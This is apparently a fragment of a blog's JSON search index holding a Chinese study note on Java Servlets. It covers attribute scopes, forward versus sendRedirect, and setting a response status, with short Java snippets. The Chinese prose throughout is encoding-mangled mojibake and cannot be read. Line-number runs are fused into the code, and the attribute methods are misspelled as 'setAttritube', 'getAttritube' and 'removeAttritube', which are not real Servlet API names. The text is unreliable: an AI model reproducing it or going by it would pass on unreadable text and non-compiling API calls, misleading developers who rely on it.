1è¯·æ±‚åŸŸ &lt; ä¼šè¯åŸŸ &lt; ä¸Šä¸‹æ–‡åŸŸ ä½œç”¨åŸŸå­˜å€¼ 1setAttritube(&quot;é”®&quot;ï¼Œâ€œå€¼â€) å–å€¼ 1getAttritube(&quot;é”®&quot;) åˆ é™¤ 1removeAttritube(&quot;é”®&quot;) è½¬å‘å®ç°é¡µé¢è·³è½¬ï¼Œä»ä¸€ä¸ªservletè·³è½¬åˆ°å¦ä¸€ä¸ªservlet 123456789public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType((&quot;text/html;charset=utf-8&quot;)); RequestDispatcher requestDispatcher=request.getRequestDispatcher(&quot;demo&quot;); requestDispatcher.forward(request,response); }} è·³è½¬åˆ°demo è½¬å‘çš„ç‰¹ç‚¹ï¼š 12341.åœ°å€æ ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ˜¾ç¤ºçš„è¿˜æ˜¯ä¸Šä¸€ä¸ªservletçš„åœ°å€2.ä¸€å…±åªæœ‰ä¸€æ¬¡è¯·æ±‚ï¼šè¯·æ±‚ä¸æ–­é“¾3.è¯·æ±‚åŸŸä¸­æ•°æ®ä¸ä¼šä¸¢å¤±ï¼šè¿˜æ˜¯è¦æ»¡è¶³è¯·æ±‚ä¸æ–­é“¾ã€‚4.è½¬å‘ä¸­ï¼Œæ˜¯ä¸€æ¬¡è¯·æ±‚çš„ é‡å®šå‘123456public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.sendRedirect(&quot;demo&quot;); }} æ•ˆæœ é‡å®šå‘çš„ç‰¹ç‚¹ï¼š 12341.åœ°å€æ ï¼šæœ‰å˜åŒ–ï¼Œæ˜¾ç¤ºæ–°çš„åœ°å€2.2æ¬¡è¯·æ±‚3.è¯·æ±‚åŸŸä¸­çš„æ•°æ®ï¼šæ–­é“¾å°±æ•°æ®ä¸¢å¤±äº†4.é‡å®šå‘çš„æ ¹ç›®å½•æ˜¯ï¼šhttp://localhost:8080/ä¸åŒ…å«é¡¹ç›®çš„è®¿é—®åœ°å€ HttpServletResponseè®¾ç½®å“åº”çš„çŠ¶æ€ç  1234567891011121314package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class ResponseDemo extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setStatus(200); }}","link":"/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/"}],"tags":[],"categories":[]}